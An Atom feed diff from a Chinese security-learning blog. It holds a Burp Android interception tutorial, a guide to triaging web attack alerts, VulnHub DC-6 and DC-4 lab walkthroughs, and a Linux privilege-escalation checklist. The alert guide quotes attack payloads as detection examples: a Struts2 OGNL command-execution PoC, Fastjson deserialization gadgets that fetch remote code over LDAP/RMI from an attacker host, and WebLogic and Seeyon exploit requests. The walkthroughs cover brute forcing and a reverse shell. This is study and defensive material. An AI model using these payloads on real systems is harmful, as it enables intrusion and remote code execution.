@@ -1,0 +1,1286 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>https://wghahaha.github.io</id>
+    <title>Nige-W</title>
+    <updated>2023-03-12T12:39:37.356Z</updated>
+    <generator>https://github.com/jpmonette/feed</generator>
+    <link rel="alternate" href="https://wghahaha.github.io"/>
+    <link rel="self" href="https://wghahaha.github.io/atom.xml"/>
+    <subtitle>天雨虽宽，不润无根之草</subtitle>
+    <logo>https://wghahaha.github.io/images/avatar.png</logo>
+    <icon>https://wghahaha.github.io/favicon.ico</icon>
+    <rights>All rights reserved 2023, Nige-W</rights>
+    <entry>
+        <title type="html"><![CDATA[有手就会的burp抓取安卓数据包教程]]></title>
+        <id>https://wghahaha.github.io/post/you-shou-jiu-hui-de-burp-zhua-qu-an-zhuo-app-shu-ju-bao-jiao-cheng/</id>
+        <link href="https://wghahaha.github.io/post/you-shou-jiu-hui-de-burp-zhua-qu-an-zhuo-app-shu-ju-bao-jiao-cheng/">
+        </link>
+        <updated>2023-03-12T12:35:48.000Z</updated>
+        <content type="html"><![CDATA[<p>前言：</p>
+<p>burp是玩web安全的神器，可以抓取web页面的数据包。我们使用大多也是抓取电脑上web页面的包。但是 有时候在手机上访问的web页面与电脑上是不一样的，以及我们有时候还需要抓取小程序或者app的数据包。</p>
+<p>目前网上的教程大都基本上就是两种方法 分别为让手机和电脑处于同一局域网段中，或者使用模拟器抓包。这里我主要介绍一下使用模拟器抓包的方法。很多和我一样的新手师傅可能没接触过这方面，或者使用的方法太复杂。下面的教程就比较简单 属于有手就会。</p>
+<h5 id="安装模拟器">安装模拟器</h5>
+<p>这里我使用的是mumu模拟器。https://mumu.163.com/   直接去这个网站下载安装就可以了。</p>
+<h5 id="配置代理与ca证书">配置代理与CA证书</h5>
+<p>首先在burp设置监听的IP和端口。</p>
+<figure data-type="image" tabindex="1"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230312202607059.png" alt="image-20230312202607059" loading="lazy"></figure>
+<p>然后到模拟器中配置</p>
+<p>步骤为 设置 -&gt; WIFI-&gt;鼠标长按WIFI名字-&gt;修改网络   信息设置为与在burp设置中的一样</p>
+<figure data-type="image" tabindex="2"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230312202749702.png" alt="image-20230312202749702" loading="lazy"></figure>
+<p>访问设置的IP和端口 比如我的为 172.2010.3:8888</p>
+<p>然后点击安装证书</p>
+<figure data-type="image" tabindex="3"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230312203125219.png" alt="image-20230312203125219" loading="lazy"></figure>
+<p>然后到文件管理器将刚才的文件后缀修改为 cer</p>
+<figure data-type="image" tabindex="4"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230312203220896.png" alt="image-20230312203220896" loading="lazy"></figure>
+<p>然后点击两下文件 安装证书，名字随便取。</p>
+<h5 id="抓取数据包">抓取数据包</h5>
+<p>安装号尝试随便点网站，再到burp看是否成功抓取。</p>
+<figure data-type="image" tabindex="5"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230312203343909.png" alt="image-20230312203343909" loading="lazy"></figure>
+<figure data-type="image" tabindex="6"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230312203354126.png" alt="image-20230312203354126" loading="lazy"></figure>
+<p>成功抓取。</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Web常见告警学习]]></title>
+        <id>https://wghahaha.github.io/post/web-chang-jian-gao-jing-xue-xi/</id>
+        <link href="https://wghahaha.github.io/post/web-chang-jian-gao-jing-xue-xi/">
+        </link>
+        <updated>2023-03-11T07:12:48.000Z</updated>
+        <content type="html"><![CDATA[<h4 id="web常见告警分析学习">web常见告警分析学习</h4>
+<p>最近由于一些个人原因没有什么学习，摆烂了一段时间。这两天状态好点了，准备开始好好学习下了。刚好前段时间 george师傅 前段时间给我发了点hvv 应急告警的东西，（感觉不好好学习，都对不起这位师傅了。今天他又给我发了一些面试题。）也算是为了今年的 hvv 做点准备。</p>
+<p>文章基于timeline sec团队学习。</p>
+<h5 id="一般告警">一般告警</h5>
+<p>这里的一般告警指的就是常见的top10漏洞引发的告警信息，比如 sql xss 文件上传之类的。</p>
+<h6 id="sql注入告警">SQL注入告警</h6>
+<p>原理：把SQL命令插入到Web表单递交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的 SQL命令。</p>
+<figure data-type="image" tabindex="1"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230311143959209.png" alt="image-20230311143959209" loading="lazy"></figure>
+<p>从HTTP流量看SQL注入的payload</p>
+<figure data-type="image" tabindex="2"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230311144119539.png" alt="image-20230311144119539" loading="lazy"></figure>
+<p><strong>如何进行研判</strong>：判断设备告警信息中是否含有select，union，concat等sql语句的关键字，然后判断是否为正常 的业务语句，如果不是业务语句，则根据返回包判断是否成功注入，返回包无法判断的，可以自己将payload 复制下来，进行burp发包，根据发包的实际情况判断是否存在注入。</p>
+<p>需要注意的是有时候会遇到 hex url base64 之类的编码，这种情况下需要进行解码操作。</p>
+<h6 id="xss告警">XSS告警</h6>
+<p>原理：由于程序后端未做过滤，导致攻击者可以将恶意代码植入到正常的页面中。</p>
+<figure data-type="image" tabindex="3"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230311144432659.png" alt="image-20230311144432659" loading="lazy"></figure>
+<figure data-type="image" tabindex="4"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230311144458399.png" alt="image-20230311144458399" loading="lazy"></figure>
+<p>流量特征：含有script，html标签等关键字。</p>
+<figure data-type="image" tabindex="5"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230311144517440.png" alt="image-20230311144517440" loading="lazy"></figure>
+<p><strong>如何进行研判</strong>：判断设备告警信息中是否含有script，html标签等关键字，之后可到相应web页面去查看（注 意：不要登录系统账号）是否存在具体的payload。</p>
+<p>注：payload可能进行html，url等格式编码，有时需要进行解码。</p>
+<h6 id="暴力破解告警">暴力破解告警</h6>
+<p>原理：暴力破解漏洞的产生来自于服务器没有对输入参数次数进行限制。导致攻击者可以通过暴力的手段进 行破解所需要的信息。</p>
+<p>流量特征</p>
+<figure data-type="image" tabindex="6"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230311144625428.png" alt="image-20230311144625428" loading="lazy"></figure>
+<figure data-type="image" tabindex="7"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230311144643999.png" alt="image-20230311144643999" loading="lazy"></figure>
+<p><strong>如何进行研判</strong>：</p>
+<pre><code> 1、状态码：100次30x，1次200，或者颠倒 
+
+ 2、状态码相同，看返回包内容，比如： Success：true，success：false；
+
+ 3、以上信息都判断完毕之后，使用暴破出的密码直接登录，看是否能登录成功。
+</code></pre>
+<h6 id="文件上传告警">文件上传告警</h6>
+<p>原理：后台对文件上传格式校验不严格中间件存在解析漏洞，导致文件上传可绕过。</p>
+<p>流量特征 看是否又恶意代码</p>
+<figure data-type="image" tabindex="8"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230311144752780.png" alt="image-20230311144752780" loading="lazy"></figure>
+<figure data-type="image" tabindex="9"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230311144804255.png" alt="image-20230311144804255" loading="lazy"></figure>
+<p><strong>文件上传常用的方法</strong>：</p>
+<pre><code>1、CMS本身存在文件上传漏洞 
+
+2、编辑器漏洞 Eweditor Fckeditor ueditor 
+
+3、中间件解析漏洞 IIS 5.x-6.0 xx.asp;.jpg /123.asp/ddd.jpg .aspx/.asa/.cer/.cdx IIS7/7.5 Fast-cgi开启 xx.jpg后面加/xx.php / xx.jpg/xx.php解析为 php 文件 Apache apache就会把sec.php.owf.rar解析成php 
+
+4、PUT方法开启直接上传 
+
+5、nginx %00 在文件名后添加一个%00字节，可以截断某些函数对文件名的判断
+
+//关于这个部分 往期我有一篇博客内容更加详细。是基于黑白名单的绕过写的。
+</code></pre>
+<h5 id="常见cms告警">常见CMS告警</h5>
+<p>一些cms具有nday 攻击者可以利用这些poc 和 exp 直接打。</p>
+<h6 id="discuz-告警">Discuz 告警</h6>
+<p>Discuz!ML V3.2-3.4代码执行漏洞</p>
+<p>原理：Discuz!ML 系统对cookie中的l接收的language参数内容未过滤，导致字符串拼接，从而执行php代码。 检测方式： 在流量字段中检查language或者含有language的参数，是否含有php代码。</p>
+<figure data-type="image" tabindex="10"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230311145441207.png" alt="image-20230311145441207" loading="lazy"></figure>
+<h6 id="致远oa文件上传实则代码执行">致远OA文件上传（实则代码执行）</h6>
+<pre><code>致远文件上传
+原理：对formulaManager参数校验不完整，导致Java代码被gzip ISO-8859-1与URL编码后可进行Java代码执行。
+检测方式：
+1、URL特征：
+/autoinstall.do.css/..;/ajax.do?method=ajaxAction&amp;managerName=formulaManager&amp;requestCompress=gzip
+2、对arguments参数进行解码
+&quot;pocContent&quot;: 
+&quot;managerMethod=validate&amp;arguments=%1F%C2%8B%08%00%00%00%00%00%00%00%C2%8B%C2%AEVO%C3%8B%2F%
+C3%8A-
+%C3%8DI%0C%C2%A9%2CHU%C2%B7R0%C3%94Q%C2%80%C2%89%C3%B8%25%C3%A6%C2%82D%C3%94KR%C2%8BK%C
+3%94%11%C3%82%C2%AE%15%05E%C2%A9%C3%85%C3%85%C2%99%C3%B9y+%C3%89%C3%A0%C2%92%C2%A2%C3%8C%
+C2%BCt%C2%85%C2%82%C3%84%C2%92%0C%05%5B%05%25C%25%C3%ABZk%C2%90%06%0DM%C3%AB%C2%94%C3%94
+4%C2%85%C3%A2%C2%92%C3%84%C2%92%C3%8Cd%C2%85%C2%8A%C2%8A%0A%0D%C3%8Dj%C3%B5Z%C2%A0%29%40
+%C2%93%C2%AAAtIQi%C2%AAz%2C%00l%C3%BA%C2%92%C3%AC%C2%80%00%00%00&quot;
+3、检测工具：
+https://github.com/TimelineSec/ATTCK-Tools-library/tree/master/SeeyonEx
+</code></pre>
+<h5 id="struts2漏洞告警">Struts2漏洞告警</h5>
+<h6 id="struts2命令执行告警">Struts2命令执行告警</h6>
+<p>原理：OGNL表达式动态执行Java代码</p>
+<p>POC</p>
+<pre><code>%{
+#a=(new java.lang.ProcessBuilder(new
+java.lang.String[]{&quot;whoami&quot;})).redirectErrorStream(true).start(),
+#b=#a.getInputStream(),
+#c=new java.io.InputStreamReader(#b),
+#d=new java.io.BufferedReader(#c),
+#e=new char[50000],
+#d.read(#e),
+#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),
+#f.getWriter().println(new java.lang.String(#e)),
+#f.getWriter().flush(),#f.getWriter().close()
+}
+</code></pre>
+<h5 id="fastjson漏洞告警">FastJson漏洞告警</h5>
+<h6 id="fastjson反序列化">fastJson反序列化</h6>
+<pre><code class="language-java">public class User {
+private int age;
+private String userName;
+public User() {
+System.out.println(&quot;User construct&quot;);
+}public String getUserName() {
+System.out.println(&quot;getUserName&quot;);
+return userName;
+}public void setUserName(String userName) {
+System.out.println(&quot;setUserName:&quot; + userName);
+this.userName = userName;
+}public int getAge() {
+System.out.println(&quot;getAge&quot;);
+return age;
+}public void setAge(int age) {
+System.out.println(&quot;setAge:&quot; + age);
+this.age = age;
+}
+    ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
+String jsonstr = &quot;{\&quot;@type\&quot;:\&quot;test_fastjson.User\&quot;, \&quot;age\&quot;:24,\&quot;userName\&quot;:\&quot;李四\&quot;}&quot;;
+try {
+JSON.parseObject(jsonstr);
+}catch (Exception e) {
+System.out.println(e.getMessage());
+}
+
+    
+    //输出结果
+User construct
+setAge:24
+setUserName:李四
+getAge
+getUserName
+</code></pre>
+<pre><code class="language-java">常见的反序列化链流量特征（ TemplatesImpl） ：
+{
+&quot;@type&quot; : &quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;,
+“_bytecodes” : 
+[“yv66vgAAADQAPQoADQAcCQAdAB4IAB8KACAAIQcAIggAIwoAJAAlCgAkACYKACcAKAcA
+KQoACgAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUY
+WJsZQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL
+3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXp
+lci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACkV4Y2VwdGlvbnMHAC0BAKYoTGNvbS9zdW
+4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwY
+WNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXB
+hY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAI
+PGNsaW5pdD4BAA1TdGFja01hcFRhYmxlBwApAQAKU291cmNlRmlsZQEACUV2aWwuamF2
+YQwADgAPBwAuDAAvADABAAVQd25lZAcAMQwAMgAzAQAQamF2YS9sYW5nL1N0cmluZ
+wEABGNhbGMHADQMADUANgwANwA4BwA5DAA6ADsBABNqYXZhL2xhbmcvRXhjZXB0a
+W9uDAA8AA8BABJ0ZXN0X2Zhc3Rqc29uL0V2aWwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsY
+W4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9
+vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAQam
+F2YS9sYW5nL1N5c3RlbQEAA2VycgEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwE],
+&quot;_name&quot; : &quot;a&quot;,&quot;_tfactory&quot; : {}, &quot;outputProperties&quot; : {}}
+</code></pre>
+<pre><code class="language-java">常见的反序列化链流量特征（ JdbcRowSetImpl ） ：
+Rmi方式：
+{&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://192.168.50.131:9999/
+Exploit&quot;,&quot;autoCommit&quot;:true}
+LDAP方式：
+{&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://192.168.50.131:9999
+/Exploit&quot;,&quot;autoCommit&quot;:true}
+其余流量特征：1.2.25版本开始，进一步添加了配置项setAutoTypeSupport以及白名单
+{
+&quot;@type&quot;: &quot;java.lang.Class&quot;,
+&quot;val&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;
+} 
+{&quot;a&quot;: {
+&quot;@type&quot;: &quot;java.lang.Class&quot;,
+&quot;val&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;
+},&quot;b&quot;: {
+&quot;@type&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;,
+&quot;dataSourceName&quot;: &quot;ldap://192.168.50.131:9999/Exploit&quot;,
+&quot;autoCommit&quot;: true
+}
+}
+</code></pre>
+<h5 id="weblogic反序列化">weblogic反序列化</h5>
+<h6 id="weblogic漏洞告警-xmldecoder类型反序列化">Weblogic漏洞告警-XMLDecoder类型反序列化</h6>
+<pre><code class="language-shell">因为XMLDecoder对SOAP形式的XML文件进行解析，对WorkContext标签内的所有标签进行解析，将java标签下的第一个职位class的object标签解析为需要加载的类，将最后一个class值为method的void标签解析为加载的类所要使用的方法，将array标签内class的值解析为方
+法的参数类型，length为参数的个数，中间的void+string类型的标签为方法执行的各个参数值。
+</code></pre>
+<p>POC</p>
+<figure data-type="image" tabindex="11"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230311150405115.png" alt="image-20230311150405115" loading="lazy"></figure>
+<pre><code class="language-xml">CVE-2019-2725 10.3.6POC：
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;soapenv:Envelope
+xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt; &lt;soapenv:Header&gt;
+&lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;
+&lt;java&gt;
+&lt;array 
+method=&quot;forName&quot;&gt;&lt;string&gt;oracle.toplink.internal.sessions.UnitOfWorkChangeSet&lt;/string
+&gt;
+&lt;void&gt;
+&lt;array class=&quot;byte&quot; length=反序列化数据字节的长度&gt; 
+&lt;void index=&quot;0&quot;&gt; &lt;byte&gt;-84&lt;/byte&gt; ... ... &lt;/array&gt;
+&lt;/void&gt;
+&lt;/class&gt; 
+&lt;/java&gt; 
+&lt;/work:WorkContext&gt;
+</code></pre>
+<p><strong>CVE-2019-2725 12.1.3 POC</strong></p>
+<figure data-type="image" tabindex="12"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230311150518814.png" alt="image-20230311150518814" loading="lazy"></figure>
+<h6 id="weblogic漏洞告警-t3类型反序列化">Weblogic漏洞告警-T3类型反序列化</h6>
+<p>原理：因为T3数据传输结构的特殊性，导致了它可以进行反序列化利用</p>
+<figure data-type="image" tabindex="13"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230311150647696.png" alt="image-20230311150647696" loading="lazy"></figure>
+<p>流量特征：</p>
+<p>在TCP流量中（T3协议基于TCP协议），反序列化数据通常以ac ed 00 05开头，在T3中开头 特征都一样，结尾为：fe010000</p>
+<p>所以，拿到T3的流量包用wireshark打开跟踪TCP流：</p>
+<figure data-type="image" tabindex="14"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230311150829477.png" alt="image-20230311150829477" loading="lazy"></figure>
+<p>hex解码</p>
+<figure data-type="image" tabindex="15"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230311150901561.png" alt="image-20230311150901561" loading="lazy"></figure>
+<h6 id="weblogic漏洞告警-iiop类型反序列化">Weblogic漏洞告警-IIOP类型反序列化</h6>
+<p>GIOP也是基于TCP，同样可以造成反序列化代码执行</p>
+<p>流量特征：</p>
+<figure data-type="image" tabindex="16"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230311151010634.png" alt="image-20230311151010634" loading="lazy"></figure>
+<h5 id="shiro漏洞告警">Shiro漏洞告警</h5>
+<h6 id="shiro反序列化告警">Shiro反序列化告警</h6>
+<pre><code>Shiro550原理：
+Shiro组件会将前端的cookie中的RememberMe参数进行AES及Base64解密，然后将其反序
+列化。
+Shiro721原理：
+在Shiro550之后，Shiro要求提供正确的cookie以进行身份校验，而正确的cookie之后的恶意
+反序列化字段则会被Oracle Padding解密，导致反序列化代码执行
+流量特征：
+发送数据包中还有RememberMe字段且RememberMe字段含有大量的Base64编码，返回包
+中含有remeberMe=deleteMe。
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[vulnhub DC-6 靶机]]></title>
+        <id>https://wghahaha.github.io/post/vulnhub-dc-6-ba-ji/</id>
+        <link href="https://wghahaha.github.io/post/vulnhub-dc-6-ba-ji/">
+        </link>
+        <updated>2023-03-08T11:51:21.000Z</updated>
+        <content type="html"><![CDATA[<h4 id="dc-6-靶机">DC - 6 靶机</h4>
+<p>前言：</p>
+<p>为什么直接到DC 6 了呢？ 因为DC -5 最后一步提权那里一直还没有做好。看了下 DC 6感觉这个简单点。</p>
+<p>攻击机 ： kali             192.168.56.132</p>
+<p>受害机 ： DC -6          192.168.56.147</p>
+<p>过关条件：入侵靶机提权到root权限得到flag。</p>
+<h5 id="内网信息探测">内网信息探测</h5>
+<pre><code class="language-shell">arp-scan -l
+nmap -A -p1-65535 -T4 192.168.56.147
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230308193129882.png" alt="image-20230308193129882" loading="lazy"></figure>
+<p>得到靶机的地址以及开放端口。</p>
+<p>访问靶机地址，发现无法访问。首先想到需要修改本地host文件，操作与DC 2 类似</p>
+<p>添加</p>
+<pre><code class="language-shell">192.168.56.147   wordy
+</code></pre>
+<p>可以正常访问。</p>
+<figure data-type="image" tabindex="2"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230308193406911.png" alt="image-20230308193406911" loading="lazy"></figure>
+<p>直接访问后台登录口</p>
+<figure data-type="image" tabindex="3"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230308193505803.png" alt="image-20230308193505803" loading="lazy"></figure>
+<h5 id="暴力破解">暴力破解</h5>
+<p>使用wpscan 枚举用户名</p>
+<pre><code class="language-shell">wpscan --url wordy -e user.txt
+</code></pre>
+<p>用kali自带的字典<code>rockyou.txt</code>导出包含k01的密码导出来的字典爆破</p>
+<pre><code class="language-shell">#先解压密码字典
+gunzip /usr/share/wordlists/rockyou.txt.gz /usr/share/wordlists/rockyou.txt
+
+cat /usr/share/wordlists/rockyou.txt | grep k01 &gt; pwd.txt
+
+#用户名和密码字典都有了，开始爆破
+wpscan --url wordy -U user.txt -P pwd.txt   //数据很多，直接看结果吧
+#爆破出来账号：mark 密码：helpdesk01
+</code></pre>
+<figure data-type="image" tabindex="4"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/1a3dec7b8b324f0397e08513fd2d86c2.png" alt="在这里插入图片描述" loading="lazy"></figure>
+<h5 id="任意命令执行">任意命令执行</h5>
+<p>登录进后台，到处点发现在 Activity monitor 存在 任意命令执行漏洞。</p>
+<figure data-type="image" tabindex="5"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230308193940618.png" alt="image-20230308193940618" loading="lazy"></figure>
+<figure data-type="image" tabindex="6"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230308193952439.png" alt="image-20230308193952439" loading="lazy"></figure>
+<h5 id="反弹shell">反弹shell</h5>
+<p>burp抓包 修改请求包 使用nc反弹shell</p>
+<figure data-type="image" tabindex="7"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230308194109587.png" alt="image-20230308194109587" loading="lazy"></figure>
+<p>不是完整的shell环境使用python的pty模块</p>
+<pre><code class="language-shell">python -c &quot;import pty;pty.spawn('/bin/bash')&quot;
+</code></pre>
+<figure data-type="image" tabindex="8"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230308194210099.png" alt="image-20230308194210099" loading="lazy"></figure>
+<p>成功获取到shell环境。</p>
+<figure data-type="image" tabindex="9"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230308194452920.png" alt="image-20230308194452920" loading="lazy"></figure>
+<p>通过移动到其他账号查看 <strong>sudo提权</strong>  通过 namp成功提权得到flag。</p>
+<h5 id="总结">总结</h5>
+<p>这个靶机的任意命令执行那里的发现比较麻烦，还有就是反弹shell的编写。提权思路也挺骚的。需要下来多尝试并理解。</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[一些可进行Linux提权的操作]]></title>
+        <id>https://wghahaha.github.io/post/linux-xia-ti-quan-de-yi-xie-zong-jie/</id>
+        <link href="https://wghahaha.github.io/post/linux-xia-ti-quan-de-yi-xie-zong-jie/">
+        </link>
+        <updated>2023-03-07T12:33:22.000Z</updated>
+        <content type="html"><![CDATA[<h4 id="关于linux权限提升">关于Linux权限提升</h4>
+<p>前言：最近打靶场遇到提权的地方就有点懵逼。于是就在网上搜集资料学习总结下。知识清单的形式，没有涉及到每一步操作。只是说下现在大体有哪些思路。(长期更新)。</p>
+<h5 id="内核提权">内核提权</h5>
+<p>就是通过服务器本身的漏洞进行提权。</p>
+<p>成功得到 反弹 shell后，对服务器的信息进行一波信息收集。例如：发行版本 内核版本之类。然后到使用Linux-exploit-suggester和Searchsploit得到相应的EXP。</p>
+<h5 id="suid提权">SUID提权</h5>
+<p>SUID是一种特殊的文件属性，它允许用户执行的文件以该文件的拥有者的身份运行 ，简单的说就是，当我们以一个普通用户去运行一个root用户所有的SUID文件，那么运行该文件我们就可以获取到root权限</p>
+<pre><code class="language-shell">//一些POC
+find / -user root -perm -4000 -print 2&gt;/dev/null
+find / -perm -u=s -type f 2&gt;/dev/null
+find / -user root -perm -4000 -exec ls -ldb {} \;
+
+为文件附上这样的权限可以使用命令：chmod u+s 或者chmod 4755
+</code></pre>
+<h5 id="计划任务提权">计划任务提权</h5>
+<pre><code class="language-shell">大概思路就是，对于可能存在的权限配置不当的有root权限的计划任务，使我们普通用户也拥有修改权限，我们修改其中的内容，为bash、less、more等赋予SUID权限，与SUID提权结合，使之提权成功
+
+系统内可能会有一些定时执行的任务，一般这些任务由crontab来管理，具有所属用户的权限。非root权限的用户是不可以列出root用户的计划任务的。但是/etc/内系统的计划任务可以被列出。
+</code></pre>
+<h5 id="配置错误导致提权">配置错误导致提权</h5>
+<p>使用<strong>unix-privesc-check</strong>      <strong>linuxprivchecker</strong>  这两款可以查找一些错误配置。</p>
+<h5 id="sudo提权"><strong>sudo提权</strong></h5>
+<p>一般情况下，如果普通用户想要提权到<code>root</code>权限使用<code>sudo</code>命令的话，都需要输入密码，但是，如果管理员为了方便登录和管理，对配置文件<code>/etc/sudoers</code>进行更改，使其<code>sudo</code>免密登录。</p>
+<h5 id="明文root密码提权">明文root密码提权</h5>
+<p>一般来说 ，linux的用户和密码 都和<code>/etc/passwd和/etc/shadow</code>这两个文件有关。<code>/etc/passwd</code>中存储的是用户，其中X代表密码<code>hash</code>被放在/<code>etc/shadow</code>文件中，并且<code>/etc/passwd</code>全用户可读。<code>/etc/shadow</code>中存储的就是密码的<code>hash</code>，只有root用户可读。</p>
+<h5 id="第三方服务提权">第三方服务提权</h5>
+<pre><code class="language-shell">1.UDF提权
+
+2.MOF提权
+
+3.启动项提权
+
+4.CVE-2016-6663、CVE-2016-6664组合提权
+
+5.反弹端口提权 
+
+6.git提权
+
+7.exim 4提权
+
+8.screen提权
+
+9.pip提权
+
+10.zip提权
+.
+.
+.
+</code></pre>
+<h5 id="总结">总结</h5>
+<p>这些都是在网上收集的一些资料，很多我都实验过。篇幅也比较短，没有一步一步写，大概说明有这个东西就可以了。对于提权这个东西，我感觉和那些绕过 免杀是一样的，只有自己遇到了，实验了，总结了。才会有收获。但是我自己的感觉目前比较好用的还是内核提权。其次师傅们注意收集一些第三方服务提权吧。很多提权方式，我还是感觉挺鸡肋的。</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[图书馆摸鱼文章]]></title>
+        <id>https://wghahaha.github.io/post/tu-shu-guan-mo-yu-wen-zhang/</id>
+        <link href="https://wghahaha.github.io/post/tu-shu-guan-mo-yu-wen-zhang/">
+        </link>
+        <updated>2023-03-06T12:03:17.000Z</updated>
+        <content type="html"><![CDATA[<p>闲来无事，说一说。这几个月，用了很多平台 博客园 CSDN wordpress notion gridea 等但是为什么一直坚持写博客的原因。<br>
+博客于我言，不像很多微信公众号，知识星球而言。我一直没有希望他可以给我带来任何的收益 并且目前的我。也没有能力带来收益。他更多的是 一个我记录笔记的平台。可以让我对于知识进行更好的记录和梳理。基本上我学一个知识点和打了一些比较有意思的靶场，都会记录下来。除了有些涉及到内部的知识点确实没放出来。</p>
+<h5 id="为什么不直接在本地记录">为什么不直接在本地记录？</h5>
+<p>我一直认为一个人可以学到的知识始终是有限的，通过在大家之间相互写技术博客，相互之间的看。或许可以了解到自己领域没有学到过的知识。进而得到成长。这或许也就是在安全圈子里面，大家喜欢称呼 ”师傅“ 的原因吧。每个人身上都有其他人可以学习的地方。可能有些 玩src很厉害，但是他不会内网。有些内网很厉害，但是他代码审计不太好。看视频的学习周期太长了，而且容易懵逼。通过看师傅之间的博客，可以很好的对知识内容有一个大概的了解。</p>
+<h5 id="长期写博客带来的好处">长期写博客带来的好处？</h5>
+<p>我虽然说博客和笔记很像，但是还是有些地方是不一样的。其实说白了 写博客我们都希望可以让更多的人看到，那么我们就会极大程度的保证文章内容的正确性。我们在做笔记的时候，有时候就得过且过了。没有对这个知识进行深入的研究。从而可能这个知识点理解可能本身就是有问题的。还有的好处就是，可能在面试的时候，你如果在简历上写上博客地址的话。可能可以让面试官更加了解你吧。还有就是可以证明，你是一个热爱技术，并长期坚持学习了的吧。</p>
+<h5 id="其他">其他</h5>
+<p>其他的话，我认为博客可以在一定程度上当一个疏解口。心态不好的时候，可以写一些文章梳理下思路。调整下学习状态。我记得有个大师傅就在他博客上写了他生活 工作的很多事情。还有些师傅写了自己的一些舔狗日记。</p>
+<p>总的来说，博客可能我还会坚持写一段时间，工作之后写不写还不知道。短期来说，还在学生时代的我，还会进行记录的。内容会涉及到 像安全相关 编程语言学习。还有就是一些技术方面的心得。最后就是今天这样的吹水文。我挺喜欢写 吹水文的，写了后感觉人的状态仿佛都不一样了。但是这种文还是少写为妙哈哈哈</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[vulnhub DC-4 靶机]]></title>
+        <id>https://wghahaha.github.io/post/vulnhub-dc-4-ba-ji/</id>
+        <link href="https://wghahaha.github.io/post/vulnhub-dc-4-ba-ji/">
+        </link>
+        <updated>2023-03-06T12:00:54.000Z</updated>
+        <content type="html"><![CDATA[<h4 id="dc-4-靶机">DC-4 靶机</h4>
+<p>前言：</p>
+<p>这个靶机的难度相对于前面总体靶机的难度是更低的，但是这个靶机的提权方式确实比较特别。和前面的有点不一样。</p>
+<p>过关条件：得到root权限获取flag</p>
+<p>攻击机：kali                      192.168.56.132</p>
+<p>受害机：DC-4                    192.168.56.145</p>
